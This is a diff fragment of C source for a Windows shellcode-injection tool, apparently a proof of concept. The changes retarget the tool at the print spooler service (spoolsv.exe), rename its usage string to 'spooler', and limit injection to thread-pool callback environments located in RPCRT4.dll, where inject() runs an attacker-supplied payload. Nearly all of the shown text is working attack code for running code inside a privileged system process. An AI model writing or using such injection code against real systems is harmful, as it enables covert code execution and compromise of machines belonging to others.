@@ -33,12 +33,14 @@
 #include <windows.h>
 #include <tlhelp32.h>
 #include <psapi.h>
+#include <shlwapi.h>
 
 #include <stdio.h>
 
 #pragma comment(lib, "advapi32.lib")
 #pragma comment(lib, "shell32.lib")
 #pragma comment(lib, "winspool.lib")
+#pragma comment(lib, "shlwapi.lib")
 
 SIZE_T payloadSize;    // size of shellcode
 LPVOID payload;        // local pointer to shellcode
@@ -272,11 +274,13 @@ BOOL FindEnviron(HANDLE hProcess,
       if(IsValidCBE(hProcess, &cbe)) {
         // obtain module name where callback resides
         GetMappedFileName(hProcess, (LPVOID)cbe.Callback, filename, MAX_PATH);
-        wprintf(L"Found CBE at %p for %s\n",  addr+pos, filename);
-        // try run payload using this CBE
-        // if successful, end scan
-        bFound = inject(hProcess, addr+pos, &cbe);
-        if (bFound) break;
+        if(StrStrI(filename, L"RPCRT4.dll")!=NULL) {
+          wprintf(L"Found CBE at %p for %s\n",  addr+pos, filename);
+          // try run payload using this CBE
+          // if successful, end scan
+          bFound = inject(hProcess, addr+pos, &cbe);
+          if (bFound) break;
+        }
       }
     }
     return bFound;
@@ -345,7 +349,7 @@ int main(void) {
     argv = CommandLineToArgvW(GetCommandLine(), &argc);
     
     if (argc < 2) {
-      wprintf(L"usage: tpool <payload>\n");
+      wprintf(L"usage: spooler <payload>\n");
       return 0;
     }
     
@@ -368,7 +372,7 @@ int main(void) {
     }
     
     // get process id for spoolsv.exe service
-    pid = name2pid(argv[2]);
+    pid = name2pid(L"spoolsv.exe");
 
     if (pid == 0) {
       wprintf(L"unable to find pid for print spooler.\n");
